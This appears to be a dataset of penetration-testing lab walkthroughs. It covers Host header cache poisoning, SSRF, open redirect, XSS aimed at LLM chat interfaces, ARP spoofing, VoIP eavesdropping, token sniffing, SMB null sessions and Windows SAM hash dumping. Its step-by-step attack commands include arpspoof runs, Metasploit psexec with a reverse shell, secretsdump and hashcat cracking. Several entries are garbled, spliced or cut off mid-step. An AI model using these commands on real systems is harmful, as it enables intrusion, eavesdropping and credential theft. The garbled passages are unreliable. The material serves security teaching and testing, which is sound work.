Source: OWASP Top 10 A1/A10, HackerOne reports, PortSwigger Labs

Title: Cache Poisoning via Host Header
Scenario Description: Some websites and CDNs (like Fastly, Cloudflare, NGINX) cache responses to speed up performance. If they use the Host header without proper validation, attackers can inject a fake domain. If that response gets cached, future visitors will get the poisoned version — redirecting them or showing malicious content. This is dangerous when caching layers trust headers too much.
Tools Used: - Browser- Burp Suite- curl (for command-line testing)- Local Node.js/Flask App- Simple caching proxy (e.g., NGINX or Varnish)- Optional: test on public targets (safe legal targets like lab setups)
Attack Steps:
### 🟢 Step 1: Understand How This Works- When you open a website like https://example.com, your browser sends a Host: example.com header.- Some apps take this header and insert it into links (e.g., Welcome! Click https://example.com/welcome).- This response might be cached to improve performance.- If the attacker injects a fake Host: attacker.com, and the caching server stores this version, everyone now sees https://attacker.com/welcome instead of the real one!---### 🟢 Step 2: Set Up a Local Lab (for Practice)1. Create a basic Node.js app (or Flask app) that reflects the Host header:js
const express = require('express');
const app = express();
app.get('/', (req, res) => {
res.send(`Welcome! Visit About Us`);
});
app.listen(3000, () => console.log("Listening on 3000"));
2. Use NGINX as a caching proxy:nginx
proxy_cache_path /tmp/cache levels=1:2 keys_zone=mycache:10m;
server {
listen 80;
location / {
proxy_pass http://localhost:3000;
proxy_cache mycache;
proxy_cache_key "$scheme$proxy_host$request_uri";
}
}
---### 🟢 Step 3: Normal RequestUse your browser or this curl command:bash
curl -H "Host: localhost" http://localhost/
You’ll see a proper message:Welcome! Visit http://localhost/about---### 🟢 Step 4: Poison the CacheNow inject a fake Host header:bash
curl -H "Host: attacker.com" http://localhost/
This sends a valid request to the app, but fakes the host. The server responds:Welcome! Visit http://attacker.com/aboutIf the proxy caches this response, everyone else who opens the homepage now sees that poisoned link!---### 🟢 Step 5: Test for Cache PoisoningOpen the homepage again (from browser or curl):bash
curl http://localhost/
❗ If the response now includes http://attacker.com/about, the attack worked — cache is poisoned.---### 🟢 Step 6: Real-World Attack Example- A corporate website loads Host into the HTML without validation.- It’s fronted by Fastly CDN.- Attacker sends a Host: badsite.evil header and the CDN caches it.- Now thousands of users get redirected to the attacker’s site even though they visit company.com.---### 🟢 Step 7: Danger of This Attack- Cache Poisoning is powerful: • Fake links in HTML • Redirects • Injected scripts (if CSP is weak) • Brand impersonation---### 🟢 Step 8: Detect If Your Site Is Vulnerable1. Use Burp Suite to send a GET request with: Host: attacker.com2. Look at the response — does the domain attacker.com show up?3. Try using different cache-busting headers like: - X-Forwarded-Host - Forwarded: for=attacker.com4. Retest multiple times to see if cached.---### 🟢 Step 9: Secure Your Application✅ Best Practices:- Never reflect Host directly in responses — use static URLs or known base domains.- Set header validation rules: Only allow known hostnames.- Add caching control headers like: Cache-Control: no-store for dynamic pages- Configure reverse proxies/CDNs to include Host in cache key: nginx
proxy_cache_key "$scheme$host$request_uri";
- Use Vary: Host to instruct cache to treat responses differently based on Host.---### ✅ Summary for Beginners✔️ Send request with fake Host: attacker.com✔️ If server builds links using Host, the fake domain appears✔️ If cached, future users see attacker’s version — even though they visit the real site✔️ Prevention = never trust Host, sanitize input, configure cache correctly
Target Type: Any website using Host header in output & CDN cache
Vulnerability: Cache key misconfiguration, untrusted Host header
Impact: - Users redirected to malicious domains- Phishing, fake login pages, malware- Brand abuse, SEO poisoning
Detection Method: - Send requests with modified Host- Analyze HTML for reflected value- Check cache behavior and response headers
Solution: - Sanitize Host header- Set Vary: Host or strict cache keys- Avoid using Host in HTML or redirect links
Source: OWASP Web Cache Deception, PortSwigger Labs, Fastly Docs, HackerOne Reports

Title: SSRF via Host Header
Attack Type: Server-Side Request Forgery (SSRF) via Host header
Scenario Description: Web apps or APIs sometimes use the Host header to route internal requests or to form URLs that backend services fetch. If that header isn't validated, attackers can inject arbitrary internal domains or IPs (e.g., 127.0.0.1, 169.254.169.254, internal admin panels), forcing the server to fetch sensitive data from internal services and return it—breaking network boundaries.
Tools Used: Browser, curl, Burp Suite, Node.js or Python test server, optional VPN to simulate internal network
Attack Steps: ---### 🟢 Step 7: Real-World ScenarioAn e-commerce site uses Host header to call internal price service. Attacker sets Host: 169.254.169.254 (AWS metadata). Server fetches and leaks metadata containing AWS credentials. This allows full account takeover.---### 🟢 Step 8: Impact- Access to internal-only resources- Exposure of metadata or admin panels- Full system compromise- Lateral movement causing major breaches---### 🟢 Step 9: Detection Methods- Manual test: intercept requests and alter Host to internal IPs- Automated scans: use Burp, ZAP, SSRF specific modules- Logging: check if unexpected internal endpoints have been requested---### 🟢 Step 10: Mitigation & Prevention✅ Validate Host header strictly against known domain/IP whitelist✅ Never use Host header directly to build URLs or make fetch calls✅ Use environment-configured backends or hardcoded internal service addresses✅ Add blocklists for internal IP ranges in HTTP clients (e.g., 127.0.0.0/8, 169.254.169.254)✅ Monitor and alert on SSRF patterns in logs✅ Once Host header is validated or ignored, SSRF via this vector is stopped
Target Type: Web apps making backend HTTP calls using Host header
Vulnerability: Host header injection leads to SSRF when used to build backend fetch URLs
MITRE Technique: T1210 – Exploitation of Trust Boundary Bypass
Impact: Data exfiltration of internal resources, metadata, admin access, full compromise
Detection Method: Manual injection + Burp, scanning tools, server logs monitoring
Solution: Whitelist hosts/IPs, don't trust Host for URLs, block internal IP requests
Source: PortSwigger Web Academy Lab (portswigger.net, intigriti.com, amsghimire.medium.com), OWASP Testing Guide (owasp.org), Ams._.Ghimire SSRF writeup (amsghimire.medium.com)

Title: Bypass Virtual Host Routing
Scenario Description: Web servers often route requests based on the Host header (e.g., vhost.example.com). If an application doesn’t strictly validate that header, attackers can supply unexpected hostnames or IP addresses to access internal or otherwise-inaccessible virtual hosts—potentially revealing admin panels or hidden tenants.
Tools Used: Browser, curl, Burp Suite, local HTTP server with vhosts (Node.js + Apache/nginx)
Attack Steps:
### 🟢 Step 1: Understand the Concept- Virtual Hosts let one server host multiple sites distinguished by the HTTP Host header.- If routing allows unexpected values, attackers may reach unauthorized content (like admin.example.com) even when visiting user.example.com.---### 🟢 Step 2: Build a Local Lab with Two Vhosts1. Setup Apache/nginx with two vhost configs: - admin.local → shows “Admin Panel” - user.local → shows “User Site”2. Map 127.0.0.1 admin.local user.local in your hosts file.---### 🟢 Step 3: Test Legitimate Access- Browser → http://user.local/ → shows “User Site”- Browser → http://admin.local/ → shows “Admin Panel”---### 🟢 Step 4: Bypass Routing via Host Header- Send request to http://user.local/ but inject Host: admin.local:bash
curl -H "Host: admin.local" http://127.0.0.1/ # DNS bypass via IP
✅ You receive the “Admin Panel” content even while using user.local—Host header allowed you in.---### 🟢 Step 5: Observe via Burp Suite- Intercept request to user.local, modify Host header to admin.local, forward → browser displays admin panel.---### 🟢 Step 6: Real‑World ScenarioShared hosting providers host multiple domains on same IP. Malicious user updates Host to access another client’s site or admin interface.---📌---### 🟢 Step 7: Impact- Unauthorized access to private applications- Admin panel exposure- Data breaches or tenant impersonation---### 🟢 Step 8: Detection Methods- Automated scanning with different Host headers- Manual tests altering Host in Burp- Code review for reliance on Host for routing---### 🟢 Step 9: Fixes & Prevention✅ Restrict Host header: only allow known hostnames✅ Use server-side configs (NGINX/Apache) specifying expected server_name✅ Return HTTP 400 on unknown Host✅ Configure strict certificate validation for each hostname✅ Use firewall/ingress rules to block unexpected hosts✅ Once Host header is strictly validated, routing bypass is prevented.

Vulnerability: Unvalidated Host header leads to virtual host bypass
Impact: - Access unauthorized admin/content- Tenant data leaks- Privilege escalation
Detection Method: - Testing with custom Host headers via curl/Burp- Code audits for Host reliance- Automated scanning for host splitting
Solution: - Strict host validation in server configs- Reject unknown Host headers- Enforce HTTPS+cert reuse per host
Source: OWASP Testing Guide, PortSwigger Labs, Apache/nginx docs

Title: Open Redirect via Host Header
Scenario Description: Some web applications use the HTTP Host header to build redirect URLs. If this header isn't validated, attackers can send requests with a malicious Host value. The server will then redirect victims to attacker-controlled domains, even though the initial request came from a trusted domain.
Tools Used: Browser, curl, Burp Suite, local PHP or Node.js server
Attack Steps:
### 🟢 Step 1: Understand the Weakness- The server takes the Host header and uses it to build a redirect response, e.g., Location: http://${host}/welcome.- If the Host header isn’t checked, attackers can set it to any domain.---### 🟢 Step 2: Create a Vulnerable Lab PagePHP example (vuln.php):php
$host = $_SERVER['HTTP_HOST'];
header("Location: http://$host/next");
exit;
?>Run with: php -S localhost:8000---### 🟢 Step 3: Test Normal RedirectIn browser or terminal:curl -I http://localhost:8000/vuln.php✅ You see:Location: http://localhost:8000/next---### 🟢 Step 4: Attack with Malicious Host HeaderSend crafted request:bash
curl -I -H "Host: evil.com" http://localhost:8000/vuln.php
✅ The response shows:Location: http://evil.com/next — attacker-controlled redirect.---### 🟢 Step 5: Use Burp Suite to Demonstrate1. Intercept the request to /vuln.php.2. Modify the Host header to something like hacker.com.3. Forward request — browser will redirect to http://hacker.com/next.---### 🟢 Step 6: Real‑World ScenarioAn email or chat directs a victim to https://bank.com/vuln.php.✉️ Email looks legitimate. Clicking it causes the browser to follow the Location: http://evil.site/next redirect — leading to a phishing page.---### 🟢 Step 7: Impact- Phishing: victim redirected to a fake login page- Brand trust loss as the redirect is served from a real site- Exploit chaining: further injection or credential theft---### 🟢 Step 8: Detecting Vulnerability- Manually intercept redirect and change the Host header.- Use scanning tools like Burp or ZAP to test variations.- Perform source code search for dynamic redirects using $_SERVER['HTTP_HOST'] or req.headers.host.---### 🟢 Step 9: Fix and Prevent✅ Do not use Host header when building redirect URLs.✅ Use a fixed trusted domain, e.g., header("Location: https://yourdomain.com/next");✅ Or validate Host against a whitelist of allowed domains.✅ Send HTTP 400 or error when Host is unexpected.✅ Once corrected, attackers cannot force redirects via malicious Host values.

Vulnerability: Unvalidated Host header used in redirect response
Impact: • Victims sent to phishing/evil sites- Brand trust eroded- Possible follow-up attacks
Detection Method: • Modify Host header manually and check response- Proxy-carried tests with scanning tools- Audit code for misuse of Host in redirects
Solution: • Use fixed domains in redirect- Whitelist expected Host values- Reject or error on unexpected Host- Avoid dynamic Host-based redirects
Source: OWASP Top 10, PortSwigger Labs, HackerOne reports

Title: Cross‑Site Scripting (Reflected) via Host Header
Attack Type: Reflected XSS via HTTP Host header
Scenario Description: An AI assistant or LLM backend returns the Host header in responses (e.g., links, prompts), allowing attackers to inject JavaScript via a malicious custom Host, which executes in victims' browsers.
Attack Steps: Step 1: Attacker identifies an LLM-based web interface or API that constructs links or prompts based on the Host header, for example a reset link like https:///reset?.... Step 2: Using a proxy (e.g., Burp Suite), the attacker crafts a request with a manipulated Host header containing JavaScript, such as evil.com">. Step 3: The HTTP request is sent: GET /somepath HTTP/1.1\r\nHost: evil.com">\r\n... and forwarded to the target. Step 4: The server does not sanitize the Host header and reflects it directly into an HTML response or JSON field used by the LLM UI. For example, it renders /link">Click in the AI chat view. Step 5: Victim visits a legitimate URL (e.g., https://ai.example.com/chat) but the attacker convinces them to use their malicious domain via phishing or by manipulating DNS forwarding. Step 6: Victim loads the page, and the injected executes in their browser context. Step 7: This allows session hijacking, token theft, or unauthorized LLM prompt steering (e.g., forcing the assistant to leak content, fetch URLs, or reveal memory). Step 8: Attacker may chain this with LLM prompt injection, directing the AI to reveal private data or internal logs. Step 9: To confirm and debug, attacker observes the alert or network requests in DevTools, verifying payload execution. Step 10: This flaw originates from unsanitized usage of Host header in HTML templates or JSON. It’s 100% reproducible if prompt UIs derive URL context from headers. Step 11: Mitigation requires strict validation and encoding of the Host header, using a fixed canonical domain or a server-side mapping.
Impact: Credential theft, session hijack, prompt manipulation
Detection Method: Scan for Host echo in HTML/JSON; use automated XSS detectors; inspect DevTools
Solution: Whitelist valid hostnames; HTML-encode header values; use Content Security Policy (CSP); fix prompt UI to use canonical domain
Source: OWASP Top 10, MITRE, XSS Cheat Sheet

Title: Host Header Based CSRF Token Bypass

Scenario Description: Many web apps validate CSRF tokens based on the Host header to prevent cross-site requests. """, token=token)

The tool outputs: - Supported TLS versions - Cipher order - Certificate issuer and expiry - Server name (sometimes OS!)✅ This is highly accurate fingerprinting, widely used by professionals.---### 🟢 Step 5: (Optional) Use Wireshark to View Handshake1. Target Type: Public or Internal HTTPS Web Servers
MITRE Technique: T1592.004 – Gather Victim Host Information: Server
Impact: - Reveals web server type, certificate, OS info- Helps in planning future attacks (e.g., outdated TLS or weak cipher use)
Detection Method: - Monitor TLS handshake analysis with IDS- Use SIEM (like Splunk) to flag excessive TLS fingerprinting

Title: Session Hijacking via Cookie Theft
Scenario Description: Victim logs into a test web application over unsecured network (HTTP). Attacker intercepts session cookie and uses it to hijack victim’s session—mimicking real-world public Wi‑Fi attacks.
Tools Used: ✅ 2 browsers (victim + attacker) ✅ Wireshark or TCP‑dump ✅ Optional: Web‑proxy like Burp ✅ Local test site supporting HTTP login
Attack Steps: Step 1: Lab Setup (Real-Life Context) – use two browsers or VMs on same Wi‑Fi network. One logs in (victim), one runs packet sniffer (attacker).Step 2: Victim Login – have victim browser open http://testsite.local/login, enter credentials and log in. Site responds with session cookie. Step 3: Start Packet Capture – on attacker: launch Wireshark, choose interface, set filter: http.cookie or tcp.port==80. Start capturing.Step 4: Trigger Cookie Sending – victim reloads or navigates. Their browser sends cookie in HTTP header, attacker sees packet in Wireshark.Step 5: Identify Cookie Header – In Wireshark look at HTTP GET/POST; find header line Cookie: sessionid=ABC123…. Right-click → “Follow → TCP Stream” to view full header. Copy the entire cookie string.Step 6: Inject Cookie in Attacker Browser – open attacker browser and install a cookie editor extension. Navigate to same domain testsite.local. Paste cookie name & value exactly. Save it.Step 7: Confirm Hijack – in attacker browser, open http://testsite.local/dashboard. If hijack works, you see victim's account/dashboard, meaning attacker has taken over session.Step 8: Cleanup – stop capture, remove fake cookie, log out victim, clear browser data on both. 🛑 Ethical note: Perform this only on owned test site! Do not touch real accounts or data.
Vulnerability: Session cookie sent over HTTP without Secure & HttpOnly flags
Detection Method: Sniff HTTP traffic for cookies; logs with no new login but unusual IP access
Solution: Enforce HTTPS exclusively; add Secure, HttpOnly, SameSite; use HSTS; rotate session on login; monitor cookie use
Source: OWASP WSTG (owasp.org, en.wikipedia.org, barracuda.com, invicti.com, attack.mitre.org)

Title: JavaScript Injection via MITM Proxy

Title: Sniffing VoIP via ARP poisoning
Scenario Description: In a local switched network (e.g., office WLAN or VLAN), a malicious user on the same LAN can use ARP poisoning to position themselves between two VoIP phones/mobile softphones, capturing Real-time Transport Protocol (RTP) packets, which carry voice. These packets can subsequently be reconstructed into an audio conversation.
Tools Used: ✅ Linux (e.g., Kali)✅ dsniff suite (arpspoof)✅ Wireshark/tcpdump✅ Xplico/vomit for audio reconstruction
Attack Steps: 1) Lab Setup (10 min) - Connect three devices to same LAN: Phone A (caller), Phone B (callee), Attacker PC.- Ensure Phones use RTP (UDP port 5004–9000) and SIP signalling on 5060.2) Reconnaissance (5 min)- On attacker PC run: nmap -sU -p5060,5004-9000 192.168.1.0/24- Identify IPs of phones.3) Enable IP Forwarding (1 min)- View echo 1 > /proc/sys/net/ipv4/ip_forward to forward intercepted packets.4) Poison ARP Caches (3 min)- Run: sudo arpspoof -i eth0 -t 192.168.1.10 -r 192.168.1.20- This fools phone A into sending to attacker, and attacker to phone B.5) Start Packet Capture (Begin Call)- Use Wireshark: capture UDP on ports 5060 and RTP range.- Or: sudo tcpdump -i eth0 udp portrange 5000-9000 -w voip.pcap6) Make a Test Call- Initiate call from Phone A to B.- Let it run for ~30 s.7) Stop Capture and Poisoning- Ctrl+C on arpspoof and tcpdump.- Disable forwarding: echo 0 > /proc/sys/net/ipv4/ip_forward.8) Reconstruct Audio- Load voip.pcap in Wireshark or Xplico.- Use Telephony → RTP → Decode to reconstruct call audio.9) Review & Cleanup- Listen to intercepted conversation.- Restore ARP by rebooting devices.- Clear any logs and network settings.✅ You successfully eavesdropped on a VoIP call.10) Ethics & Cleanup- Only perform in lab.- Do not use on real or public networks.
Target Type: IP Phones or Softphones on LAN
Vulnerability: Lack of encryption; ARP spoofing possibility
Impact: Privacy breach; call eavesdropping; potential data leak
Detection Method: Monitor ARP table changes; use IPS to detect ARP spoofing
Solution: Enforce encrypted VoIP (SRTP), DHCP snooping, static ARP, ARP inspection

Title: Capturing API Tokens over HTTP
Scenario Description: In this simulation, the attacker captures sensitive authentication tokens (e.g., API keys or JSON Web Tokens) being sent via unencrypted HTTP requests between a web or mobile app and a backend server. Many APIs expose tokens in request headers or URL parameters. On an insecure network (e.g., open Wi-Fi), this token can be sniffed and used to impersonate a user or access protected resources.

Attack Steps:
### 🟢 STEP 1: Set Up the Lab Environment1. Use 2 devices connected to same open Wi-Fi (or hotspot): - Victim Device: Browser or app that connects to a test HTTP API - Attacker Device: Kali Linux machine running Wireshark2. Install Wireshark on attacker machine:sudo apt update && sudo apt install wireshark---### 🟢 STEP 2: Start Wireshark to Capture Network Traffic1. Open Wireshark on Kali.2. Select your active network interface (e.g., wlan0 for Wi-Fi).3. Set the capture filter (top bar):http4. Click Start to begin capturing.---### 🟢 STEP 3: Victim Sends an API Request1. On victim device, open browser or Postman.2. Send a request to a test API endpoint that uses HTTP (not HTTPS). - Example test API: http://httpbin.org/bearer - Add a custom Authorization Header: - Key: Authorization - Value: Bearer eyJhbGciOi... (any JWT token)✅ This sends the token over HTTP (not encrypted).---### 🟢 STEP 4: Capture and Extract the JWT or Token1. In Wireshark, go to the top menu → Statistics > Conversations → TCP tab → find victim IP.2. Filter by IP and look for HTTP packets.3. In the packet list, click a request line, then look at the bottom “Packet Details” pane.4. Find and expand Hypertext Transfer Protocol section.5. Look for the Authorization: Bearer or X-API-Key headers.✅ You will see the actual token, like:Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...---### 🟢 STEP 5: Replay the Captured Token1. Revoke token if you’re using a real test app.4. Delete any logs/tokens saved on disk.✅ Lab complete. Do NOT try this on real networks. Use a safe, offline test setup only.

Title: ARP Spoofing + DoS
Scenario Description: In a local network (like in home, office, or lab), an attacker can send forged ARP replies to a victim device and the default gateway (router), poisoning their ARP cache. If the attacker drops or doesn't forward packets between them, the victim will lose access to the internet or local services. This is a basic Denial of Service via ARP Spoofing.
Tools Used: ✅ Kali Linux✅ arpspoof (dsniff)✅ Wireshark (optional)✅ Echo command for IP forwarding✅ Open Wi-Fi router and 2 devices for lab setup
Attack Steps: ### 🟢 STEP 1: Lab Setup1. Take 2 devices and connect both to same Wi-Fi or LAN: - Device A = Victim (e.g., Windows/Phone) - Device B = Attacker (Kali Linux)2. Find the IP address and Gateway IP: - On Victim: ipconfig (Windows) or ifconfig/ip a (Linux) - Usually Gateway is something like 192.168.1.1 - Note down victim’s IP (e.g., 192.168.1.5) and gateway (e.g., 192.168.1.1)---### 🟢 STEP 2: Disable IP Forwarding (for DoS)You're going to block communication, not forward packets.In Kali terminal:echo 0 > /proc/sys/net/ipv4/ip_forwardThis ensures Kali won’t forward packets.---### 🟢 STEP 3: Launch ARP Spoofing (DoS Mode)Use arpspoof to poison ARP tables:1. Open terminal:arpspoof -i wlan0 -t 192.168.1.5 192.168.1.1This tells victim (192.168.1.5) that you are the router (192.168.1.1)2. Open a second terminal:arpspoof -i wlan0 -t 192.168.1.1 192.168.1.5<brThis tells router that you are the victim.Now you are in the middle, but because forwarding is off, the packets go nowhere = DoS.---### 🟢 STEP 4: Confirm Denial of Service1. On victim device, try opening google.com.2. You’ll notice: ❌ No internet access.3. You’ve successfully broken the victim’s connection.Optional: - Open Wireshark and watch ARP packets flying every few seconds - Filter: arp---### 🛑 STEP 5: Stop the Attack and Restore Network1. Press Ctrl+C on both terminals to stop spoofing.2. On Kali: - Re-enable IP forwarding (if needed): echo 1 > /proc/sys/net/ipv4/ip_forward3. On victim device: - Reboot OR - Open command prompt and run: arp -d to flush the ARP table✅ Network should now be restored.---⚠️ Warning: Only do this in test labs or private networks with permission. This can knock devices offline.DO NOT try on college, office, or real user networks.
Vulnerability: ARP is trust-based and lacks authentication; no verification of MAC/IP pairs
Impact: - Complete internet disruption- Service outage- App failures- VoIP/Zoom/MS Teams disruption
Detection Method: - Monitor ARP table changes- Look for repeated ARP replies- Use intrusion detection systems (IDS) like Snort
Solution: - Use Static ARP entries- Enable Dynamic ARP Inspection on managed switches- Implement Port Security- Prefer encrypted communication like HTTPS/SSH
Source: MITRE ATT&CK, OWASP, GIAC GCIH, Vartai Security, InfosecTrain, Medium Labs

Title: ARP Spoofing over Wi-Fi
Scenario Description: In a public or private Wi-Fi network (same SSID), an attacker uses ARP spoofing to impersonate the router (default gateway). Victim devices then send all their network traffic to the attacker. This allows the attacker to either drop packets (DoS), sniff data (e.g., credentials, tokens), or modify it. Works if the network has no client isolation.
Tools Used: ✅ Kali Linux✅ arpspoof (dsniff)✅ Wireshark✅ 2 Wi-Fi devices on same SSID✅ Browser (on victim device) for testing
Attack Steps: ### 🟢 STEP 1: Set Up Lab with Same Wi-Fi1. Connect Victim (e.g., Windows laptop or phone) to Wi-Fi named TestWiFi2. Connect Attacker (Kali Linux) to same TestWiFi3. On Victim, open terminal/cmd:ipconfig (Windows) or ip a (Linux) → Note IPAlso note Default Gateway IP (e.g., 192.168.0.1)---### 🟢 STEP 2: Enable Packet ForwardingTo silently MITM (not DoS), enable forwarding:echo 1 > /proc/sys/net/ipv4/ip_forward---### 🟢 STEP 3: Start ARP SpoofingOpen two terminals in Kali:Terminal 1 (spoof Victim):arpspoof -i wlan0 -t 192.168.0.5 192.168.0.1Terminal 2 (spoof Router):arpspoof -i wlan0 -t 192.168.0.1 192.168.0.5✅ Now, Victim thinks Attacker is Router, and vice versa.---### 🟢 STEP 4: Open Wireshark to Capture Traffic1. Start Wireshark on Kali2. Choose interface wlan03. Filter: http or tcp.port == 804. Have victim browse a site that uses HTTP (e.g., http://neverssl.com)✅ You’ll capture URLs, cookies, etc.---### 🟢 STEP 5: Optional – DoS (Disable Forwarding)To cut off the victim from internet:echo 0 > /proc/sys/net/ipv4/ip_forwardNow attacker drops all packets – Victim loses connectivity.---### 🛑 STEP 6: Clean Up1. Press Ctrl+C on arpspoof windows2. Flush ARP tables on victim: - Windows: arp -d - Linux: ip -s -s neigh flush all3. Reboot router (optional)✅ Network is restored. Use test environment only. Detection Method: Monitor ARP tables; Use ARPWatch; Detect frequent ARP broadcasts; Look for gateway MAC mismatch

Source: MITRE ATT&CK T1557.002, GIAC GCIH, Offensive Security Labs

Title: Local DNS Spoofing via Bettercap + ARP

This redirects the victim to a fake website, such as a phishing page, instead of the real one. Bettercap automates this process with powerful modules.
Tools Used: ✅ Kali Linux✅ Bettercap✅ Wi-Fi network (same subnet)✅ Fake HTTP server (optional)✅ Browser (on victim device)
Attack Steps:
### 🟢 STEP 1: Lab Setup1. Connect Victim device and Kali Linux (Attacker) to the same Wi-Fi (SSID)2. On victim, find its IP and gateway: - Run ipconfig (Windows) or ip a (Linux) - Example: - Victim IP: 192.168.1.10 - Gateway IP: 192.168.1.1---### 🟢 STEP 2: Install Bettercap (if not installed)Run in Kali:sudo apt update && sudo apt install bettercap -y---### 🟢 STEP 3: Create DNS Spoofing FileThis file tells Bettercap what domains to spoof.1. Source: MITRE ATT&CK, Bettercap Docs, InfosecTrain, Offensive Security Labs

Title: Fake DNS Server (DNS Rogue Server)

Scenario Description: In a local network (like a home lab), the attacker sets up a rogue DNS server that answers DNS queries with fake IP addresses. If a victim device is configured (or tricked via DHCP poisoning) to use this DNS server, it will resolve domains like google.com to an attacker-controlled IP, leading to phishing, MITM, or malware download.

Title: Brute Force SMB Logins
Scenario Description: SMB (Server Message Block) allows users to access shared folders and services. If an SMB server (Windows or Linux Samba) is exposed on the network and secured with weak passwords or default users, attackers can use tools like Hydra or Medusa to guess credentials by brute force. This simulation shows how to brute force SMB login credentials on a Metasploitable2 VM using Hydra, then log in using smbclient to access files. Press Windows + R2. Type: \\192.168.56.1013. Enter username: msfadmin, password: msfadmin✅ Shares will appear in Windows Explorer---### 🛑 STEP 8: Cleanup Lab• Stop Hydra and Medusa processes• Delete wordlists if needed:rm users.txt passwords.txt• Shutdown VMs after testing🧠 Tip: Brute forcing SMB logins is a classic step after discovering open port 445. Target Type: Windows or Linux Samba SMB servers
Vulnerability: Weak SMB credentials, poor password policy, open SMB ports
Impact: - Unauthorized login to shared drives- Access to internal company files- Potential for malware upload or lateral movement

Title: Null Session Enumeration
Scenario Description: A null session is an unauthenticated connection to the IPC$ share on a Windows system using the SMB protocol. Misconfigured Windows systems (especially older ones like Windows 2000/2003/XP or misconfigured Windows 7/10) allow attackers to connect without any credentials and enumerate sensitive information like usernames, group names, policies, shares, and NetBIOS info. This lab simulates how an attacker on Kali Linux uses tools like enum4linux, rpcclient, and nmap to gather this information by exploiting a null session. This is for safe lab use only, never real systems.
Tools Used: ✅ Kali Linux (attacker)✅ Windows 7 / Metasploitable2 (target)✅ enum4linux✅ rpcclient✅ smbclient (pre-installed)✅ nmap (optional)✅ VirtualBox / VMware
Attack Steps:
### 🟢 STEP 1: Set Up Lab Environment1. Launch Kali Linux (attacker VM).2. Launch Windows 7 / Metasploitable2 (target VM).3. Make sure both are in same NAT or Host-Only network.4. On the target, check the IP:Windows → Open Command Prompt → ipconfig → Note IP (e.g., 192.168.56.104)✅ Ensure SMB (port 445) is enabled. You can test from Kali using:nmap -p 139,445 -sV 192.168.56.104---### 🟢 STEP 2: Try Anonymous SMB LoginIn Kali terminal:smbclient -L //192.168.56.104/ -N📌 Explanation:• -L = List shares• -N = No password prompt (null session)✅ If shares are listed (like IPC$, ADMIN$, etc.), null session is active!---### 🟢 STEP 3: Run Null Session with enum4linuxenum4linux is a powerful enumeration tool for SMB.Run:enum4linux 192.168.56.104✅ Output will include:• OS version (e.g., Windows 7 Professional)• User accounts (e.g., Administrator, Guest, User1)• Share names (e.g., C$, ADMIN$, PUBLIC)• Password policies• Groups📌 Example user dump:User List:
- Administrator
- Guest
- John
- Admin123---### 🟢 STEP 4: Use rpcclient for Deeper Enumerationrpcclient is like a remote control tool for SMB.Run:rpcclient -U "" 192.168.56.104Password: Just press Enter (null password)✅ You’ll get a prompt: rpcclient>Now run:• enumdomusers – List domain users• enumdomgroups – List domain groups• querydominfo – Domain info• srvinfo – Host info (OS, version, name)Exit with:exit✅ These commands work without any password, if null session is allowed.---### 🟢 STEP 5: Optional – Use Nmap NSE ScriptsRun:nmap -p 445 --script smb-enum-users,smb-enum-shares 192.168.56.104✅ Output will show:• Usernames• Groups• Share list• Guest access status---### 🛑 STEP 6: Cleanup• Close all terminal tools• Power off Windows VM after testing• Save any logs for documentation🧠 Note: Null sessions were default enabled in older Windows. Modern Windows can still be misconfigured to allow them. This is a high-severity misconfiguration. Never run this on real production servers.
Vulnerability: SMB null session enabled (allows anonymous IPC$ binding)
MITRE Technique: T1135 (Network Share Discovery)T1087.002 (Account Discovery: Domain Accounts)
Impact: - Enumeration of users, shares, domain- Reconnaissance for brute force or lateral movement- Leak of internal network structure
Detection Method: - Monitor Windows event logs- Watch for null session bindings- Detect RPC connections from unauthorized IPs- IDS/IPS with SMB signatures
Solution: - Disable null sessions via Group Policy- Use firewalls to block SMB from untrusted networks- Upgrade old systems- Enforce authentication for IPC$ access
Source: MITRE ATT&CK, SANS, OWASP, PentestMonkey, enum4linux docs

Title: Dumping SAM Hashes (If Admin Access)
Scenario Description: On Windows, all user login hashes are stored in the SAM (Security Account Manager) database. If an attacker has administrator or SYSTEM access, they can extract these hashes for offline cracking or lateral movement. This simulation shows how a pentester who already has an admin shell via Metasploit (like with psexec) or has SMB admin access, can dump hashes using tools like hashdump, secretsdump.py, or even manual registry export. This is a very powerful post-exploitation step and must be done in a safe, ethical lab setup only.
Tools Used: ✅ Kali Linux (attacker)✅ Windows 7/10/XP/Server (target)✅ Metasploit Framework✅ impacket (for secretsdump.py)✅ Valid Admin credentials✅ psexec OR existing shell✅ Cain & Abel / John / Hashcat (for offline cracking)
Attack Steps:
### 🟢 STEP 1: Lab Setup (Basic Recap)1. Open Kali Linux and Windows target (Windows 7/10/XP) in VirtualBox or VMware.2. Make sure both are on the same NAT/Host-Only network.3. Target IP: Use ipconfig on Windows (e.g., 192.168.56.104)4. Kali IP: Use ip a or ifconfig (e.g., 192.168.56.102)✅ Make sure SMB (port 445) is reachable from Kali using:nmap -p 445 192.168.56.104---### 🟢 STEP 2: Gain Admin Access (via Metasploit psexec)If you have valid admin credentials:Run in Kali:msfconsoleuse exploit/windows/smb/psexecSet options:set RHOSTS 192.168.56.104set SMBUser administratorset SMBPass admin123set PAYLOAD windows/meterpreter/reverse_tcpset LHOST 192.168.56.102run✅ If successful, you'll get a Meterpreter shell:meterpreter >---### 🟢 STEP 3: Dump SAM Hashes via MeterpreterInside the Meterpreter shell:hashdump✅ This will dump the SAM file hashes directly:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:098f6bcd4621d373cade4e832627b4f6:::
John:1001:...📌 These hashes can be cracked using John the Ripper or Hashcat.---### 🟢 STEP 4: Dump Hashes via secretsdump.py (Alternative Method)If you don’t want a shell, but have admin credentials, use this:Install Impacket if not installed:sudo apt install impacket-scriptsRun:secretsdump.py administrator:admin123@192.168.56.104✅ Output will include:• NTLM hashes• LSA secrets• Cached credentials📌 This is powerful — no shell required, works over SMB with creds only!---### 🟢 STEP 5: Crack the Hashes (Optional)Save hashes to a file:echo "Administrator:500:...:..." > hashes.txtUse John the Ripper:john hashes.txt --format=NTOr use Hashcat:hashcat -m 1000 hashes.txt rockyou.txt✅ If passwords are weak, cracking will succeed.---### 🟢 STEP 6: Manual Dump (Advanced)If you're inside Windows as SYSTEM (e.g., via RDP):Export registry manually:

